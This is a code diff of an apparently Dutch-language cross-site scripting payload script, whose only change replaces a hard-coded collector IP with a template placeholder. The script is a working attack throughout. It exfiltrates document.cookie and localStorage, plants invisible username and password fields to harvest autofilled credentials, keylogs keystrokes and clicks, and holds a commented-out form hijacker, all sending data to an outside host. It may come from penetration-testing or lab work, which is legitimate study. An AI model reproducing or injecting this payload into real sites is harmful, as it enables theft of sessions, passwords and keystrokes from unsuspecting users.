@@ -1,12 +1,12 @@
 
 var i=new Image;
-i.src="http://100.66.79.33:8085/xxs/cookies?data="+document.cookie;
+i.src="{{localhost}}/xxs/cookies?data="+document.cookie;
 
 
 let data = JSON.stringify(localStorage);
 let encodedData = encodeURIComponent(data);
 let body = document.getElementsByTagName("body")[0]
-fetch("http://100.66.79.33:8085/xxs/localstorage?data="+ encodedData);
+fetch("{{localhost}}/xxs/localstorage?data="+ encodedData);
 
 var u = document.createElement("input");
 u.type = "text";
@@ -22,13 +22,13 @@ p.style.opacity = "0";
 
 body.append(u);
 body.append(p);
-setTimeout(function(){fetch("http://100.66.79.33:8085/xxs/gebruiker?u=" + u.value + "&p=" + p.value)}, 5000);
+setTimeout(function(){fetch("{{localhost}}/xxs/gebruiker?u=" + u.value + "&p=" + p.value)}, 5000);
 
 //const formulieren = document.querySelectorAll("FORM");
 //formulieren.forEach((yolo) => {
 //yolo.addEventListener("submit", function(e) {
 //  e.preventDefault();
-//	fetch("http://100.66.79.33:8085/xxs/form", {
+//  fetch("{{localhost}}/xxs/form", {
 //      method: 'POST',
 //      data: new FormData(yolo)
 //    });
@@ -41,12 +41,12 @@ setTimeout(function(){fetch("http://100.66.79.33:8085/xxs/gebruiker?u=" + u.valu
 function click(e){
     e = e || window.event;
     var target = e.target || e.srcElement;
-    fetch("http://100.66.79.33:8085/xxs/keylogger?data=\n\n<klik>"+target+"</klik>");
+    fetch("{{localhost}}/xxs/keylogger?data=\n\n<klik>"+target+"</klik>");
 
 
 
 }
 
-function logKey(event){fetch("http://100.66.79.33:8085/xxs/keylogger?data=" + event.key);}
+function logKey(event){fetch("{{localhost}}/xxs/keylogger?data=" + event.key);}
 document.addEventListener('keydown', logKey);
 document.addEventListener('click', click);
